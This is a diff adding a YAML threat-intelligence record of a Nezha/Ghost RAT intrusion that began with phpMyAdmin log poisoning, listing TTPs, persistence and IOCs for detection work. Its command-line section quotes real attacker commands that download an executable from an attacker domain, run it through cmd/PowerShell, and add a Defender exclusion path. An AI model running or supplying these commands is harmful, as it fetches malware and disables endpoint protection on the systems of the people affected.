@@ -1,0 +1,78 @@
+description: Threat actor used log poisoning via phpMyAdmin to deploy a web shell,
+  then leveraged AntSword and Nezha RMM to install Ghost RAT on compromised hosts.
+attribution: China-nexus threat actor (Nezha)
+malware_families:
+- Nezha
+- Ghost RAT
+- Nezha Agent
+TTPs:
+  processes:
+  - httpd.exe
+  - powershell.exe
+  - live.exe
+  - x.exe
+  - SQLlite.exe
+  - rundll32.exe
+  - cmd.exe
+  commandline:
+  - '''curl -O https://rism.pages.dev/microsoft.exe-stag'''
+  - '''Add-MpPreference -ExclusionPath ''C:\WINDOWS'''''
+  - cmd.exe /c "powershell /c \"cd C:\\\\Windows\\\\Cursors\";.\\live.exe https://rism.pages.dev/microsoft.exe;echo
+    8394e84;(pwd).path;echo a7ad42acaca"
+  - powershell /c "curl -O live.exe https://rism.pages.dev/microsoft.exe"
+  - cmd.exe /c "powershell /c \"cd C:/xamp/htdocs\";whoami;echo c706fe7013;(pwd).path;echo
+    8acf72"
+  powershell: []
+  scripting_engine: []
+  registry_keys:
+  - HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SQLlite
+  image_load: []
+  network_connections:
+  - process: httpd.exe
+    destination: 45.207.220.12
+    port: 80
+  - process: x.exe
+    destination: gd.bj2.xyz
+    port: 443
+  - executable: live.exe
+    destination: https://rism.pages.dev/microsoft.exe
+    port: 443
+  - executable: cmd.exe
+    destination: https://rism.pages.dev/config.yml
+    port: 443
+  file_activity:
+  - C:\\Windows\\Cursors\\live.exe
+  - C:\\Windows\\Cursors\\x.exe
+  - C:\\Program Files\\Common Files\\scvhost.exe
+  - C:\\Windows\\System32\\SQLlite.exe
+  - C:\\xamp\\htdocs\\123.php
+  - C:\\Windows\\system32\\SQLlite.exe
+  - C:\\Windows\\system32\\32138546.dll
+  persistence:
+  - 'Service creation: SQLlite (renamed rundll32)'
+  - Service (Own Process) named SQLlite
+  process_relations: []
+IOCs:
+  ips:
+  - 54.46.50.255
+  - 45.207.220.12
+  - 38.246.250.201
+  - 172.245.52.169
+  domains:
+  - rism.pages.dev
+  - c.mid.al
+  - gd.bj2.xyz
+  - host404111.xyz
+  hashes:
+  - f3570bb6e0f9c695d48f89f043380b43831dd0f6fe79b16eda2a3ffd9fd7ad16
+  - 9f33095a24471bed55ce11803e4ebbed5118bfb5d3861baf1c8214efcd9e7de6
+  - 7b2599ed54b72daec0acfd32744c7a9a77b19e6cf4e1651837175e4606dbc958
+  - 82611e60a2c5de23a1b976bb3b9a32c4427cb60a002e4c27cadfa84031d87999
+  - 35e0b22139fb27d2c9721aedf5770d893423bf029e1f56be92485ff8fce210f3
+authors:
+- Jai Minton
+- James Northey
+- Alden Schmidt
+reference: https://www.huntress.com/blog/nezha-china-nexus-threat-actor-tool
+date_of_publication: October 8, 2025
+file_creation_date: October 10, 2025
